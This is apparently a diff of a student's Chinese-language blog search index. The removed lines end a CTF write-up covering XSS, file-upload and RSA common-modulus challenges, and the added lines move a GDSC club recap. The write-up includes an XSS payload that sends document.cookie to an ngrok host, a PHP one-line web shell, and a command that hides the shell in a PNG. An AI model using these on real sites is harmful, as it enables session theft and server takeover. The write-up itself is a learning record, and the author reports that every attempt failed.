-<p>到了這邊，我原本以為是要把合法的 ID 和 XSS 的 payload 結合在一起，並在 Report 的地方提交。但經過助教的提示之後，知道應該是要把 payload 提交在 note 的內文，所以我開始重新研究一次 app.js 的程式碼。發現了之前沒仔細看到可能可以注入 XSS 的地方，如下。</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/note/:noteId&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> noteId = req.<span class="property">params</span>.<span class="property">noteId</span>;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="variable constant_">NOTES</span>.<span class="title function_">get</span>(noteId);</span><br><span class="line">    <span class="keyword">if</span> (!note) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Note not found!&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`&lt;h1&gt;Your Note&lt;h1&gt;&lt;p id=&quot;note&quot;&gt;<span class="subst">$&#123;note&#125;</span>&lt;/p&gt;`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
-
-<p>在這段程式碼中，可以看到我們提交的 note 會被夾在 p 標籤中解析，所以我嘗試注入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>發現不能執行，因為 app.js 裡面限制了允許的標籤白名單，只有 s、b、u、p、code 這五個標籤能使用，其餘的標籤會被 strip 掉。知道可以用的標籤後，我使用了 p 標籤提交，嘗試執行 javascript，payload 如下:</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;p/onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;test&lt;p&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>發現 note 只會被解析成<code>test</code>，而移動滑鼠到上面的時候也確實會執行 js，因此接下來要做的就是修改 payload，並再提交 note 後去 report 的地方提交 id，讓 visit 去執行到我們提交的腳本，就可以得到 cookie 了。</p>
-<p>我用 ngrok 在本地先架了個伺服器，並且嘗試透過其獲取 cookie，payload 如下:</p>
-<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">&lt;p/onmouseover=document.location.href=&quot;https://1ffb-36-234-174-194.ngrok-free.app/&quot;+document.cookie style=&quot;position:fixed;left:0;top:0;width:9999px;height:9999px;&quot;&gt;test<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>但是因為 onmouseover 屬性需要有滑鼠滑過，即便我把 p 標籤調整的很大，但因為 visit 函數不會有滑鼠滑過，所以還是不會執行。很可惜到了截止的最後，還是沒能找出正確的 payload 獲取到 flag。</p>
-<p>最後來談談這個漏洞在真實世界可能的危害，題目在每次回報完後都會提示<code>admin will check your report</code>，這告訴我們如果真實世界中有人利用 XSS 漏洞注入了惡意代碼，而當系統管理員去”check”的時候，自己的 cookie 可能就會被利用，讓有心人士可以在不知道 admin 帳號密碼的情況下以 admin 的權限登入系統。</p>
-<h1 id="Uploader"><a href="#Uploader" class="headerlink" title="Uploader"></a>Uploader</h1><p>在這題裡面，我先嘗試上傳了一張正常的圖片，發現網頁會呈現這樣的狀態。<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/ByG6mhhcT.png"
-                     
-                ><br>我一開始先用了課程中教過的一句話木馬來嘗試上傳，我上傳的是 php 檔。</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>結果系統會回應<code>not a PNG file</code>，這表示前端會檢測是否為合法的上傳檔案類型，我又嘗試把檔名修改為<code>shell.php.png</code>再進行上傳，結果系統的回應是<code>Invalid image</code>，表示後端也有檢測他是否為 PNG 檔案。後來又嘗試了很多其他的方法，包括在 php payload 前面加上 magic numbers <code>89504E47</code>嘗試讓系統解析為 PNG 檔，但得到的回應都跟前面差不多。</p>
-<p>最後，在經過一番搜尋、查找資料後，發現只剩下一個方法，就是上傳圖片馬。所謂的圖片馬，就是把圖片和木馬組合在一起上傳。於是我準備了一張正常的 png(normal.png)和惡意的 php 代碼(shell.php)，將其放在同一個路徑底下。接著利用以下的指令將其組合為惡意圖片馬(pwn.png):</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy normal.png/b + shell.php/a pwn.png</span><br></pre></td></tr></table></figure></div>
-
-<p>接著我將 pwn.png 上傳，發現系統回應<code>Bad content</code>，到這邊，比賽就結束了，結果最後還是沒能成功地取得 Flag，QQ。</p>
-<h1 id="Common-modulus"><a href="#Common-modulus" class="headerlink" title="Common modulus"></a>Common modulus</h1><p>這題的題目給了三個 e(公鑰)，三個 c(密文)，還有一個 n(質數因子相乘)，如果有其中兩個 e 是互質，也就是 gcd(e1, e2) &#x3D; 1 的話，就可以利用一般的共模攻擊，去求得 m(明文)，就是利用會有一組 s1 和 s2 滿足 s1 _ e1 + s2 _ e2 &#x3D; 1 的條件，加上一點計算，去找出原本的 m，如下。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">已知 s1 * e1 + s2 * e2 = 1</span><br><span class="line">==========================</span><br><span class="line">c1 ^ s1 * c2 ^ s2 mod n</span><br><span class="line">= m ^ (e1 * s1) * m ^ (e2 * s2) mod n</span><br><span class="line">= m ^ (e1 * s1 + e2 * s2) mod n</span><br><span class="line">= m mod n</span><br><span class="line">= m</span><br></pre></td></tr></table></figure></div>
-
-<p>可惜這題的三個 e 都不是互質的，所以要用其他的方法，我就找到了<a class="link"   href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701" >一篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，裡面的方法是這樣:</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcd(e1, e2) = gcd</span><br><span class="line">c1 = (m ^ e1&#x27;) ^ gcd mod n</span><br><span class="line">c2 = (m ^ e2&#x27;) ^ gcd mod n</span><br><span class="line">e1&#x27; * s1 + e2&#x27; * s2 = 1</span><br><span class="line"></span><br><span class="line">c1 ^ s1 * c2 ^s2 mod n</span><br><span class="line">= (((m ^ e1&#x27;) ^ gcd) ^ s1) * (((m ^ e2&#x27;) ^ gcd) ^s2) mod n</span><br><span class="line">= m ^ (e1&#x27; * s1 * gcd + e2&#x27; * s2 * gcd) mod n</span><br><span class="line">= m ^ gcd mod n</span><br></pre></td></tr></table></figure></div>
-
-<p>所以只要把最後算出來的 m 再開 gcd 次方根就能找到明文，於是我寫了下面的腳本。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, iroot, gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">22777210958276255973049562078823322470680917129996977683503001216538435863571279721754251786904659128777249694642787480739356668460290853226080964490087136228546045908347764486557698226166963415933243390587759408509357466384117429023536043020407223339909068182712164327318468662771341384255178839693851749833498595767285757850112681038669603653206881003854674152787778849201349140811383067441876396986225542868926178627083357794996583066978454919162611524965685485188287561894204743004599366796640463833284730895990140454443706509700257117888543581605105114423861683342316455500361042572686499019143155407840720672419</span></span><br><span class="line">e1 = <span class="number">2755481107</span></span><br><span class="line">e2 = <span class="number">3066037283</span></span><br><span class="line"><span class="comment"># e3 = 3825027809</span></span><br><span class="line">c1 = <span class="number">7927632180925780686814468716254548866073876571301670927803568567992929927231666309788681512003760545920706822481579873353923145930555620003462589361971404649174770107086295817994744475096856399932862153021335565923236506465046739212222528807145844779588311833022632475905272022533594289777471811000950934146066045472218603345107418836739010466236517799411565681939684720963118217633594133046157469386003057018852372681387318985149400851657988757739939640107583630568340335757129814894759082226790230350623403635880468479392207604875482436028050237168056669104984504520909514306552404757744266671282270481535254632231</span></span><br><span class="line">c2 = <span class="number">19162894772364755634695403163786451410245098251726628084799257554767334519905640179161346412307514221332891648206034353728374020165930677162860102377777681292582203157662333178388904577242217496599789741706061676944395451665239726479077741007297709368920091594846785681021427819585722029936761040901809601396670202192052497066209075288103228744858127970671076282164969113619499174358765991380757911727424305398346399701274033326030443722686643479760852934150701783998463047750118216160431187984416861424972003041835112849345069144579908117061092179552843173803432427193984945136248106420527309951492325647621839772126</span></span><br><span class="line"><span class="comment"># c3 = 12281989205300534636704612304895466894728582803084654071108548003638296732533233324118128443432186580642178421360358569501856887776677567285142630332770995470034693283004693504328569378601328550606731466373274474890323776647142155504550689141803732334439130044963732806927780975317712578470165550637007845813598338398021681428237912733055103663278507239375781432804708170722603762602715296180599171769475818480578806749013564273888734572033232825425951511959908980277564593244704622649568752985829748683356507419796438898916535864730103144986484287500764463579887673117770889298009984153867524175061353407719439002075</span></span><br><span class="line"></span><br><span class="line">g = gcd(e1, e2)</span><br><span class="line">e1_ = e1 // g</span><br><span class="line">e2_ = e2 // g</span><br><span class="line">l, s1, s2 = gcdext(e1_, e2_)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">m = iroot(m, g)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag = <span class="subst">&#123;long_to_bytes(m).decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-
-<p>只不過最後的答案是錯誤的，沒能找到正確的 flag。可能是因為本題的 gcd 太大，還要找其他的算法。</p>
-<h1 id="參賽心得"><a href="#參賽心得" class="headerlink" title="參賽心得"></a>參賽心得</h1><p>這次算是我第一次花了那麼多的時間打 CTF 比賽，之前可能就是自己在網路上解解題甚麼的，總的來說還是很有趣的一次體驗。而參加完這次的比賽，我也更加地意識到自己的不足，真的還有很多可以進步、練習的地方。即便可能有點被打擊信心，但我也不會氣餒，我要更努力的練習，沒事就多解解題甚麼的，增強自己的實力，希望可以在之後的比賽表現得越來越好！</p>
-<h1 id="參考資料區"><a href="#參考資料區" class="headerlink" title="參考資料區"></a>參考資料區</h1><ul>
-<li><a class="link"   href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#/%E5%85%B6%E4%BB%96%E8%A7%84%E5%88%99" >文件上傳漏洞總結 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html" >PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE ! <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://ithelp.ithome.com.tw/articles/10245459?sc=hot" >[Day 26] 026 - 串流加密法 - Stream cipher <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1" >童舒晧資安資源整理(XSS 教學) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://xz.aliyun.com/t/3952?time__1311=n4+xnD0DBDgGG=G8+eDsA3xCqm/z3K3r34D&alichlgref=https://www.google.com/" >安全工具——XSSer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://blog.csdn.net/mydriverc2/article/details/42048983?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-42048983-blog-113249158.235%5Ev43%5Epc_blog_bottom_relevance_base9&spm=1001.2101.3001.4242.2&utm_relevant_index=2" >XSSer 使用(CSDN) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701" >关于 RSA 共模攻击 e1，e2 不互素的解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://blog.csdn.net/qq_40345591/article/details/127476867" >文件上传漏洞进阶教程&#x2F;白名单绕过&#x2F;图片马制作&#x2F;图片马执行 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CyberSec</category>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Security</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024 GDSC NCKU AI Team</title>
-    <url>/DevCorner/AI/2024-GDSC-NCKU-AI-Team/</url>
-    <content><![CDATA[<h1 id="Intro-—-What-is-GDSC"><a href="#Intro-—-What-is-GDSC" class="headerlink" title="Intro — What is GDSC"></a>Intro — What is GDSC</h1><p><a class="link" href="https://gdg.tw/about/gdsc/">GDSC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>(Google Developer Student Clubs)是一個由 Google 支持的學生社群，旨在通過學生與專業開發人員聯繫，促進學生對 Google 開發人員技術的學習和應用，並為學生提供與技術專家互動和學習的機會。 GDSC 在全球有超過 100 個國家/地區的 1000 多個社群。GDSC 是學生們學習和分享技術的理想社群，並且能夠與技術行業的其他開發人員和專家建立聯繫。(以上皆是 Ctrl+c &amp; Ctrl+v)</p>
-<p>那我自己在成大待了一年的 GDSC，我認為他是個甚麼東西呢？我會說他就是專案社群+課程+演講的集合。這裡集結了一群很有想法的學生聚在一起開心地做專案，然後在這一年的專案旅程中，每兩個禮拜就會有一次社團課程。有時候是幹部們輪流教學一些開發技巧，讓大家對每個領域的技術都稍有了解；有時候是會邀請業界大佬來和我們分享經驗。</p>
-<p>總之就是一個非常有想法和對技術非常有熱忱的人所組合在一起的團隊，加入 GDSC 一定可以感受到那種英雄惜英雄的感覺！接下來，我們就從面試開始講起，來紀錄一下這一年的旅程吧！</p>
-<h1 id="Interview"><a href="#Interview" class="headerlink" title="Interview"></a>Interview</h1><p>我在大一的時候(2023)加入了成大的 GDSC，當初面試了三個組別，志願序從前面到後面分別是 AI 組、Web 組、Data 組。在面試的時候主要就是會問一些你之前有沒有過相關的經驗或是一些知識性的問題。舉 AI 組的面試來說，當初幹部就有問我甚麼是 P value、我所熟悉的程式語言、然後給我一些題目問我要怎麼去找出兩者之間的相關性（具體問題有點忘記了，畢竟是一年前。但我記得我的回答跟 Linear regression 有關），再來就是可能要清楚 Correlation doesn’t imply causation 等。除了這些比較 Hard skill 的問題，也會問你如果錄取了會如何安排時間以及 GDSC 對你而言的 Priority 等等。現在回頭看也十分可以理解當初為甚麼這麼問，畢竟一整年要和大家一起做專案，中途跑掉肯定是不太好的。</p>
-<p>後來面試完，我順利地加入了第一志願的組別，AI 組。雖然當初對於 AI 的知識沒有甚麼了解，但這剛好給了我一個機會開始展開學習。</p>
-<h1 id="About-my-team"><a href="#About-my-team" class="headerlink" title="About my team"></a>About my team</h1><p>因為這次的 AI 組人有點多，所以我們又有分成了幾個小組。而我分到的這個小組中，我是唯一一個大一生。其他的成員從大三到碩班都有（AI 組也總共兩個大一的&gt;&lt;），總之我就是裡面資歷最淺的那位。但即便如此，也不會感受到被排斥的感覺，大家也不會因為我年紀比他們小而忽視掉我在團隊中的想法（大家真的很友善，很有 Google 那種多元友善包容的感覺 XD）。</p>
-<h1 id="Our-project"><a href="#Our-project" class="headerlink" title="Our project"></a>Our project</h1><p>我們在歷經將近一個學期的討論還有熟悉彼此以及熟悉這個團隊之後（具體來說是在寒假），討論出了我們的專案主題。我們想要透過 AI 模型的分析，讓我們能夠預測股票的價格走向。我們這次訓練模型是採用特斯拉的股票來作為我們的對象，並且我們除了一般的指標外，我們另外加入了推文、新聞和特斯拉財報作為我們的 Indicators。我們的整體流程如下：</p>
-<blockquote>
-<ol>
-<li>針對推特的推文、各大媒體新聞、特斯拉財報這三個不同的文本訓練出不同的 Sentiment analysis model</li>
-<li>訓練一個準備接收上述資料做預測的 LSTM</li>
-<li>利用我們的 SA 模型去 Label 每日的資料，並傳入一個 LSTM</li>
-</ol>
-</blockquote>
-<p>最後我們每天輸入當日的三種文本的 SA 分數到我們的 LSTM 去預測隔日的股票價格，並成功得到出了還蠻精準的結果，更詳細的可以看我們的海報，如下（最下面的圖片中，右下角的指標有誤植。藍色的線為真實股價，橘色的線為我們預測的）：</p>
-<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJKaUHmIA.png" alt="我們的海報"><figcaption>我們的海報</figcaption></figure></p>
-<h1 id="My-role-in-the-team"><a href="#My-role-in-the-team" class="headerlink" title="My role in the team"></a>My role in the team</h1><p>我在我們這組是負責推文的部分。一開始，我是先用 Kaggle 找到的<a class="link" href="https://www.kaggle.com/datasets/omermetinn/tweets-about-the-top-companies-from-2015-to-2020/data?select=Company_Tweet.csv">這個資料集 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>以及<a class="link" href="https://huggingface.co/cardiffnlp/twitter-roberta-base-sentiment-latest">cardiffnlp/twitter-roberta-base-sentiment-latest <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和<a class="link" href="https://huggingface.co/austinmw/distilbert-base-uncased-finetuned-tweets-sentiment">austinmw/distilbert-base-uncased-finetuned-tweets-sentiment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>這兩個 Pre-trained Model 去幫我們的資料做 Label。</p>
-<p>但是後來我們希望可以有更近期的資料，所以我寫了<a class="link" href="https://github.com/CX330Blake/X-crawler">這個爬蟲 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>來爬取 2021 到 2024 五月的推文的資料（但因為我沒有買 API，所以只能慢慢用 Selenium 滑）。在蒐集完資料後，我用了那兩個 Model 去做 Label，並且在 Label 完後抓取相同比例的 Positive、Neutral、Negative 的資料去對 BERT 做 Fine-tune，得到<a class="link" href="https://huggingface.co/CX330Blake/tweet-sentiment-analysis-for-tesla">最後的 SA 模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
-<h1 id="NCKU-GDSC-Forum"><a href="#NCKU-GDSC-Forum" class="headerlink" title="NCKU GDSC Forum"></a>NCKU GDSC Forum</h1><p>終於到了成果發表的當天，當天就是有很多的講座以及我們自己擺設的每個小組的攤位。我們要對每位到攤位前的觀眾做講解，跟他們說我們到底做了些甚麼，然後當天的講座也是十分有趣，會很有收穫。我在聽完了前輩們的分享後，更有了想要努力前往矽谷的衝動，有種受到矽谷召喚的感覺 XD。至於更詳細的，就看一下以下的紀錄影片吧！</p>
-<div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">
-    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/MWK4geiYARs" frameborder="0" allowfullscreen=""></iframe>
-</div>
-
-<h1 id="What-I-learned-in-this-year"><a href="#What-I-learned-in-this-year" class="headerlink" title="What I learned in this year"></a>What I learned in this year</h1><p>撇除掉一些 Hard skill（這是一定會學習到的），我比較想來談談加入 GDSC 的一些 Trade-off。加入 GDSC 後，勢必會壓縮到其他的時間，所以要更懂得如何安排自己的休閒娛樂以及讀書的時間。但同時，也確實可以在這裡獲得很多學業之外的東西。比如說拓展自己的人脈、吸取更多前輩的經驗，但我覺得最重要的，是可以找到一群志同道合夥伴們。這一來可以讓自己在自我精進的這條路上更不孤單，其次也可以增加自己對這種開發社群（或是身為「開發者」）的身分認同。</p>
-<p>結論上來說，如果你同時有很多其他的活動，或是想要好好的衝一下 GPA，或許可以慎重考慮一下要不要參加（因為畢竟做專案真的會花不少時間，還要上社課）；但如果你也和我一樣，相信比起分數有更重要的事，那就大膽地來參加吧，一定會收獲不少的！</p>
-<p>最後附上我們今年 GDSC 的口號：</p>
-<blockquote>
-<p>Code your goal, Fuel your soul! — <strong><em>2024 GDSC NCKU</em></strong></p>
-</blockquote>
-<p>如果這篇文章對你有幫助，歡迎<a href="https://cx330.tw/subscribe/">訂閱我的 Blog</a>，會在有新文章的時候通知你，十分感謝！</p>
-]]></content>
-      <categories>
-        <category>DevCorner</category>
-        <category>AI</category>
-      </categories>
-      <tags>
-        <tag>AI</tag>
-        <tag>GDSC</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[Day 01] Grinding PicoCTF</title>
-    <url>/TechStreak30/2024%20CTF%20Training/Day-01-Grinding-PicoCTF/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因為已經有開了一篇文章，打算放上所有 picoCTF 的 writeups 了，所以就不把解題思路寫在這邊啦，如果想看的話請見<a href="https://cx330.tw/CyberSec/CTF/All-in-One%20PicoCTF-Writeups/">這邊</a>!</p>
-<h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><p>今天打算先刷一點 picoCTF 的題目，因為成大資安社加入戰隊的標準是一萬分，然後我現在才六千多。但是！當我今天開始刷題目之後我發現 pico 他們的制度整個大改！現在沒有計算分數的機制了，改為把題目分成三個不同的難度（像是 Leetcode 那樣），分別是 easy, medium, hard。所以不知道到時候加戰隊的標準會是多少呢，不過以下就是我今天的進度啦！</p>
-<ol>
-<li>More SQLi</li>
-<li>Trickster</li>
-</ol>
-<p>今天進度就兩題，不過感覺多多少少是有學習到新知識的。之後可能要找一天特別來研究一下 sqlmap 的文檔，到時候再出成一篇筆記文章吧！兩題可能聽起來有點少，但畢竟剛放暑假，我還在那個耍費狀態 XD，慢慢調整啦！</p>
-<h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul>
-<li>起床時間：<code>8:30</code></li>
-<li>知識量：⭐⭐⭐</li>
-<li>疲勞程度：⭐⭐</li>
-<li>精神狀態：⭐⭐⭐⭐⭐</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CyberSec</category>
-        <category>TechStreak30</category>
-        <category>CTF</category>
-        <category>2024 CTF Training</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>CyberSec</tag>
-        <tag>PicoCTF</tag>
-        <tag>TechStreak30</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Reading List</title>
-    <url>/Life%20and%20Talk/Reading%20List/Reading-List/</url>
-    <content><![CDATA[<ol>
-<li><a class="link"   href="https://johnliutw.medium.com/list/google-4cfac4644843" >Google 的軟體工程之道 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/" >Sqlmap 文檔中文版 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-</ol>
-]]></content>
-      <categories>
-        <category>Life and Talk</category>
-        <category>Reading List</category>
-      </categories>
-  </entry>
-  <entry>
     <title>[Day 02] Learning Cryptography</title>
     <url>/TechStreak30/2024%20CTF%20Training/Day-02-Learning-Cryptography/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>密碼學一直以來都是我覺得超級超級困難的東西，為了可以更好的搞清楚它，決定寫一篇筆記來給自己（和各位）當作學習的資料！我把連結放在<a href="/Notebooks/Cryptography-Notebook-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88">這個地方</a>，大家想看可以直接點過去噢！</p>
@@ -685,5 +629,61 @@
         <tag>PicoCTF</tag>
         <tag>TechStreak30</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>2024 GDSC NCKU AI Team</title>
+    <url>/DevCorner/AI/2024-GDSC-NCKU-AI-Team/</url>
+    <content><![CDATA[<h1 id="Intro-—-What-is-GDSC"><a href="#Intro-—-What-is-GDSC" class="headerlink" title="Intro — What is GDSC"></a>Intro — What is GDSC</h1><p><a class="link" href="https://gdg.tw/about/gdsc/">GDSC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>(Google Developer Student Clubs)是一個由 Google 支持的學生社群，旨在通過學生與專業開發人員聯繫，促進學生對 Google 開發人員技術的學習和應用，並為學生提供與技術專家互動和學習的機會。 GDSC 在全球有超過 100 個國家/地區的 1000 多個社群。GDSC 是學生們學習和分享技術的理想社群，並且能夠與技術行業的其他開發人員和專家建立聯繫。(以上皆是 Ctrl+c &amp; Ctrl+v)</p>
+<p>那我自己在成大待了一年的 GDSC，我認為他是個甚麼東西呢？我會說他就是專案社群+課程+演講的集合。這裡集結了一群很有想法的學生聚在一起開心地做專案，然後在這一年的專案旅程中，每兩個禮拜就會有一次社團課程。有時候是幹部們輪流教學一些開發技巧，讓大家對每個領域的技術都稍有了解；有時候是會邀請業界大佬來和我們分享經驗。</p>
+<p>總之就是一個非常有想法和對技術非常有熱忱的人所組合在一起的團隊，加入 GDSC 一定可以感受到那種英雄惜英雄的感覺！接下來，我們就從面試開始講起，來紀錄一下這一年的旅程吧！</p>
+<h1 id="Interview"><a href="#Interview" class="headerlink" title="Interview"></a>Interview</h1><p>我在大一的時候(2023)加入了成大的 GDSC，當初面試了三個組別，志願序從前面到後面分別是 AI 組、Web 組、Data 組。在面試的時候主要就是會問一些你之前有沒有過相關的經驗或是一些知識性的問題。舉 AI 組的面試來說，當初幹部就有問我甚麼是 P value、我所熟悉的程式語言、然後給我一些題目問我要怎麼去找出兩者之間的相關性（具體問題有點忘記了，畢竟是一年前。但我記得我的回答跟 Linear regression 有關），再來就是可能要清楚 Correlation doesn’t imply causation 等。除了這些比較 Hard skill 的問題，也會問你如果錄取了會如何安排時間以及 GDSC 對你而言的 Priority 等等。現在回頭看也十分可以理解當初為甚麼這麼問，畢竟一整年要和大家一起做專案，中途跑掉肯定是不太好的。</p>
+<p>後來面試完，我順利地加入了第一志願的組別，AI 組。雖然當初對於 AI 的知識沒有甚麼了解，但這剛好給了我一個機會開始展開學習。</p>
+<h1 id="About-my-team"><a href="#About-my-team" class="headerlink" title="About my team"></a>About my team</h1><p>因為這次的 AI 組人有點多，所以我們又有分成了幾個小組。而我分到的這個小組中，我是唯一一個大一生。其他的成員從大三到碩班都有（AI 組也總共兩個大一的&gt;&lt;），總之我就是裡面資歷最淺的那位。但即便如此，也不會感受到被排斥的感覺，大家也不會因為我年紀比他們小而忽視掉我在團隊中的想法（大家真的很友善，很有 Google 那種多元友善包容的感覺 XD）。</p>
+<h1 id="Our-project"><a href="#Our-project" class="headerlink" title="Our project"></a>Our project</h1><p>我們在歷經將近一個學期的討論還有熟悉彼此以及熟悉這個團隊之後（具體來說是在寒假），討論出了我們的專案主題。我們想要透過 AI 模型的分析，讓我們能夠預測股票的價格走向。我們這次訓練模型是採用特斯拉的股票來作為我們的對象，並且我們除了一般的指標外，我們另外加入了推文、新聞和特斯拉財報作為我們的 Indicators。我們的整體流程如下：</p>
+<blockquote>
+<ol>
+<li>針對推特的推文、各大媒體新聞、特斯拉財報這三個不同的文本訓練出不同的 Sentiment analysis model</li>
+<li>訓練一個準備接收上述資料做預測的 LSTM</li>
+<li>利用我們的 SA 模型去 Label 每日的資料，並傳入一個 LSTM</li>
+</ol>
+</blockquote>
+<p>最後我們每天輸入當日的三種文本的 SA 分數到我們的 LSTM 去預測隔日的股票價格，並成功得到出了還蠻精準的結果，更詳細的可以看我們的海報，如下（最下面的圖片中，右下角的指標有誤植。藍色的線為真實股價，橘色的線為我們預測的）：</p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJKaUHmIA.png" alt="我們的海報"><figcaption>我們的海報</figcaption></figure></p>
+<h1 id="My-role-in-the-team"><a href="#My-role-in-the-team" class="headerlink" title="My role in the team"></a>My role in the team</h1><p>我在我們這組是負責推文的部分。一開始，我是先用 Kaggle 找到的<a class="link" href="https://www.kaggle.com/datasets/omermetinn/tweets-about-the-top-companies-from-2015-to-2020/data?select=Company_Tweet.csv">這個資料集 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>以及<a class="link" href="https://huggingface.co/cardiffnlp/twitter-roberta-base-sentiment-latest">cardiffnlp/twitter-roberta-base-sentiment-latest <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和<a class="link" href="https://huggingface.co/austinmw/distilbert-base-uncased-finetuned-tweets-sentiment">austinmw/distilbert-base-uncased-finetuned-tweets-sentiment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>這兩個 Pre-trained Model 去幫我們的資料做 Label。</p>
+<p>但是後來我們希望可以有更近期的資料，所以我寫了<a class="link" href="https://github.com/CX330Blake/X-crawler">這個爬蟲 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>來爬取 2021 到 2024 五月的推文的資料（但因為我沒有買 API，所以只能慢慢用 Selenium 滑）。在蒐集完資料後，我用了那兩個 Model 去做 Label，並且在 Label 完後抓取相同比例的 Positive、Neutral、Negative 的資料去對 BERT 做 Fine-tune，得到<a class="link" href="https://huggingface.co/CX330Blake/tweet-sentiment-analysis-for-tesla">最後的 SA 模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
